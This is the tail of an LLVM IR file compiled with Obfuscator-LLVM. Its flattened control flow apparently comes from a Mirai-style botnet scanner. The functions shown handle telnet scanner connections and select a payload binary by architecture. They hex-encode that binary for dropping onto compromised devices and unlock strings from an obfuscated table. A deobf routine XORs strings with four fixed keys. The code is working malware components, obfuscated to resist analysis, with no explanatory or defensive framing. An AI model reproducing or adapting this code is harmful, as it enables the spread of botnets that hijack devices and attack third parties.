  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %37, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sub nsw i32 %39, 1
  %41 = call i32 @util_memsearch(i8* %38, i32 %40, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.149, i32 0, i32 0), i32 10)
  %42 = icmp ne i32 %41, -1
  %43 = select i1 %42, i32 -1945223898, i32 1610159886
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 1
  %47 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %46, i32 0, i32 1
  store i32 2, i32* %47, align 4
  store i32 268516327, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 1
  %51 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %50, i32 0, i32 1
  store i32 0, i32* %51, align 4
  store i32 268516327, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 190398460, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %5, align 4
  store i32 %54, i32* %2, align 4
  store i32 -1074707253, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %2, align 4
  ret i32 %56

loopEnd:                                          ; preds = %53, %52, %48, %44, %35, %31, %22, %21, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.payload* @get_retrieve_binary(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.payload*, align 8
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.payload*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  %6 = load i32, i32* %4, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 %7
  store %struct.payload* %8, %struct.payload** %5, align 8
  %switchVar = alloca i32
  store i32 1309081346, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1309081346, label %9
    i32 -580064374, label %13
    i32 -908685412, label %17
    i32 1180312408, label %18
    i32 -1749402061, label %29
    i32 -893464818, label %40
    i32 1897448760, label %42
    i32 842796179, label %47
    i32 -940664458, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load %struct.payload*, %struct.payload** %5, align 8
  %11 = icmp ne %struct.payload* %10, null
  %12 = select i1 %11, i32 -580064374, i32 842796179
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %4, align 4
  %15 = icmp eq i32 %14, 4
  %16 = select i1 %15, i32 -908685412, i32 1180312408
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 842796179, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 11
  %21 = load i8, i8* %20, align 2
  %22 = zext i8 %21 to i32
  %23 = load %struct.payload*, %struct.payload** %5, align 8
  %24 = getelementptr inbounds %struct.payload, %struct.payload* %23, i32 0, i32 0
  %25 = load i8, i8* %24, align 8
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %22, %26
  %28 = select i1 %27, i32 -1749402061, i32 1897448760
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 14
  %32 = load i16, i16* %31, align 2
  %33 = zext i16 %32 to i32
  %34 = load %struct.payload*, %struct.payload** %5, align 8
  %35 = getelementptr inbounds %struct.payload, %struct.payload* %34, i32 0, i32 1
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %33, %37
  %39 = select i1 %38, i32 -893464818, i32 1897448760
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load %struct.payload*, %struct.payload** %5, align 8
  store %struct.payload* %41, %struct.payload** %2, align 8
  store i32 -940664458, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load %struct.payload*, %struct.payload** %5, align 8
  %44 = getelementptr inbounds %struct.payload, %struct.payload* %43, i32 1
  store %struct.payload* %44, %struct.payload** %5, align 8
  %45 = load i32, i32* %4, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %4, align 4
  store i32 1309081346, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store %struct.payload* null, %struct.payload** %2, align 8
  store i32 -940664458, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load %struct.payload*, %struct.payload** %2, align 8
  ret %struct.payload* %49

loopEnd:                                          ; preds = %47, %42, %40, %29, %18, %17, %13, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.binary* @process_retrieve_binary(%struct.payload*) #0 {
  %2 = alloca %struct.payload*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.binary*, align 8
  %6 = alloca [5 x i8], align 1
  %7 = alloca i32, align 4
  %8 = alloca [256 x i8], align 16
  store %struct.payload* %0, %struct.payload** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 256, i32 16, i1 false)
  %10 = load %struct.payload*, %struct.payload** %2, align 8
  %11 = getelementptr inbounds %struct.payload, %struct.payload* %10, i32 0, i32 3
  %12 = load i16, i16* %11, align 8
  %13 = zext i16 %12 to i32
  %14 = sdiv i32 %13, 64
  %15 = add nsw i32 %14, 1
  %16 = sext i32 %15 to i64
  %17 = call noalias i8* @calloc(i64 %16, i64 16) #7
  %18 = bitcast i8* %17 to %struct.binary*
  store %struct.binary* %18, %struct.binary** %5, align 8
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 1024343836, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1024343836, label %19
    i32 -1143675844, label %29
    i32 -1908231082, label %36
    i32 839034573, label %39
    i32 -363050810, label %40
    i32 673380604, label %41
    i32 -1636151057, label %49
    i32 -1521616977, label %53
    i32 -1585165898, label %63
    i32 -484339026, label %64
    i32 43625759, label %81
    i32 1080775546, label %84
    i32 1855495882, label %94
    i32 -2122902123, label %96
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %3, align 4
  %21 = load %struct.payload*, %struct.payload** %2, align 8
  %22 = getelementptr inbounds %struct.payload, %struct.payload* %21, i32 0, i32 3
  %23 = load i16, i16* %22, align 8
  %24 = zext i16 %23 to i32
  %25 = sdiv i32 %24, 64
  %26 = add nsw i32 %25, 1
  %27 = icmp slt i32 %20, %26
  %28 = select i1 %27, i32 -1143675844, i32 839034573
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = call noalias i8* @malloc(i64 256) #7
  %31 = load %struct.binary*, %struct.binary** %5, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.binary, %struct.binary* %31, i64 %33
  %35 = getelementptr inbounds %struct.binary, %struct.binary* %34, i32 0, i32 0
  store i8* %30, i8** %35, align 8
  store i32 -1908231082, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %3, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %3, align 4
  store i32 1024343836, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -363050810, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 673380604, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %3, align 4
  %43 = load %struct.payload*, %struct.payload** %2, align 8
  %44 = getelementptr inbounds %struct.payload, %struct.payload* %43, i32 0, i32 3
  %45 = load i16, i16* %44, align 8
  %46 = zext i16 %45 to i32
  %47 = icmp slt i32 %42, %46
  %48 = select i1 %47, i32 -1636151057, i32 1080775546
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %3, align 4
  %51 = icmp eq i32 %50, 64
  %52 = select i1 %51, i32 -1585165898, i32 -1521616977
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %4, align 4
  %55 = load i32, i32* %3, align 4
  %56 = add nsw i32 %54, %55
  %57 = load %struct.payload*, %struct.payload** %2, align 8
  %58 = getelementptr inbounds %struct.payload, %struct.payload* %57, i32 0, i32 3
  %59 = load i16, i16* %58, align 8
  %60 = zext i16 %59 to i32
  %61 = icmp sge i32 %56, %60
  %62 = select i1 %61, i32 -1585165898, i32 -484339026
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 1080775546, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %65, i8 0, i64 5, i32 1, i1 false)
  %66 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  %67 = load %struct.payload*, %struct.payload** %2, align 8
  %68 = getelementptr inbounds %struct.payload, %struct.payload* %67, i32 0, i32 2
  %69 = load i8*, i8** %68, align 8
  %70 = load i32, i32* %4, align 4
  %71 = load i32, i32* %3, align 4
  %72 = add nsw i32 %70, %71
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %69, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = call i32 (i8*, i8*, ...) @szprintf(i8* %66, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.130, i32 0, i32 0), i32 %76)
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %79 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  %80 = call i8* @strcat(i8* %78, i8* %79) #7
  store i32 43625759, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %3, align 4
  store i32 673380604, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %7, align 4
  %86 = load %struct.payload*, %struct.payload** %2, align 8
  %87 = getelementptr inbounds %struct.payload, %struct.payload* %86, i32 0, i32 3
  %88 = load i16, i16* %87, align 8
  %89 = zext i16 %88 to i32
  %90 = sdiv i32 %89, 64
  %91 = add nsw i32 %90, 1
  %92 = icmp eq i32 %85, %91
  %93 = select i1 %92, i32 1855495882, i32 -2122902123
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load %struct.binary*, %struct.binary** %5, align 8
  ret %struct.binary* %95

; <label>:96:                                     ; preds = %loopEntry
  %97 = load %struct.binary*, %struct.binary** %5, align 8
  %98 = load i32, i32* %7, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.binary, %struct.binary* %97, i64 %99
  %101 = getelementptr inbounds %struct.binary, %struct.binary* %100, i32 0, i32 0
  %102 = load i8*, i8** %101, align 8
  %103 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %104 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %105 = call i32 @util_strlen(i8* %104)
  %106 = sext i32 %105 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %102, i8* %103, i64 %106, i32 1, i1 false)
  %107 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %107, i8 0, i64 256, i32 16, i1 false)
  %108 = load i32, i32* %7, align 4
  %109 = trunc i32 %108 to i8
  %110 = load %struct.binary*, %struct.binary** %5, align 8
  %111 = getelementptr inbounds %struct.binary, %struct.binary* %110, i32 0, i32 1
  store i8 %109, i8* %111, align 8
  %112 = load i32, i32* %7, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %7, align 4
  %114 = load i32, i32* %3, align 4
  %115 = load i32, i32* %4, align 4
  %116 = add nsw i32 %115, %114
  store i32 %116, i32* %4, align 4
  store i32 -363050810, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %96, %84, %81, %64, %63, %53, %49, %41, %40, %39, %36, %29, %19, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_method_resonse(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 7
  %9 = getelementptr inbounds [8192 x i8], [8192 x i8]* %8, i32 0, i32 0
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 4
  %12 = load i32, i32* %11, align 8
  %13 = call i32 @util_memsearch(i8* %9, i32 %12, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.150, i32 0, i32 0), i32 20)
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -869185560, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -869185560, label %first
    i32 852976559, label %16
    i32 -765460753, label %17
    i32 -1455383600, label %27
    i32 -440755307, label %28
    i32 -1021201741, label %29
    i32 465033600, label %44
    i32 -1197494935, label %45
    i32 768718237, label %47
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp ne i32 %.reload, -1
  %15 = select i1 %14, i32 852976559, i32 -765460753
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 -2, i32* %2, align 4
  store i32 768718237, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 7
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %19, i32 0, i32 0
  %21 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %21, i32 0, i32 4
  %23 = load i32, i32* %22, align 8
  %24 = call i32 @util_memsearch(i8* %20, i32 %23, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.151, i32 0, i32 0), i32 16)
  %25 = icmp ne i32 %24, -1
  %26 = select i1 %25, i32 -1455383600, i32 -440755307
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 768718237, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1021201741, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 12)
  %30 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %30, i8** %4, align 8
  %31 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %32 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %31, i32 0, i32 7
  %33 = getelementptr inbounds [8192 x i8], [8192 x i8]* %32, i32 0, i32 0
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 4
  %36 = load i32, i32* %35, align 8
  %37 = load i8*, i8** %4, align 8
  %38 = load i32, i32* %6, align 4
  %39 = sub nsw i32 %38, 1
  %40 = call i32 @util_memsearch(i8* %33, i32 %36, i8* %37, i32 %39)
  store i32 %40, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %41 = load i32, i32* %5, align 4
  %42 = icmp eq i32 %41, -1
  %43 = select i1 %42, i32 465033600, i32 -1197494935
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 768718237, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %5, align 4
  store i32 %46, i32* %2, align 4
  store i32 768718237, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %2, align 4
  ret i32 %48

loopEnd:                                          ; preds = %45, %44, %29, %28, %27, %17, %16, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_memsearch(i8*, i32, i8*, i32) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %8 = bitcast %struct.__va_list_tag* %7 to i8*
  call void @llvm.va_start(i8* %8)
  %9 = load i8*, i8** %4, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %12 = call i32 @vsprintf(i8* %9, i8* %10, %struct.__va_list_tag* %11) #7
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %14 = bitcast %struct.__va_list_tag* %13 to i8*
  call void @llvm.va_end(i8* %14)
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: nounwind
declare i32 @vsprintf(i8*, i8*, %struct.__va_list_tag*) #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #7
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* %15, i8* %16, i32 %19)
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -893339734, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -893339734, label %20
    i32 453635447, label %26
    i32 1074478678, label %59
    i32 1454083849, label %62
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = load i32*, i32** %4, align 8
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %21, %23
  %25 = select i1 %24, i32 453635447, i32 1454083849
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %6, align 8
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = xor i32 %32, 222
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %30, align 1
  %35 = load i8*, i8** %6, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = xor i32 %40, 173
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %38, align 1
  %43 = load i8*, i8** %6, align 8
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = xor i32 %48, 190
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %46, align 1
  %51 = load i8*, i8** %6, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, 239
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  store i32 1074478678, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %5, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %5, align 4
  store i32 -893339734, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %6, align 8
  ret i8* %63

loopEnd:                                          ; preds = %59, %26, %20, %switchDefault
  br label %loopEntry
}

declare void @util_memcpy(i8*, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @scanner_kill() #0 {
  %1 = load i32, i32* @scanner_pid, align 4
  %2 = call i32 @kill(i32 %1, i32 9) #7
  ret void
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noreturn nounwind }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146781110}
!2 = !{i32 -2146780704}
!3 = !{i32 -2146590635}
!4 = !{i32 -2146590226}
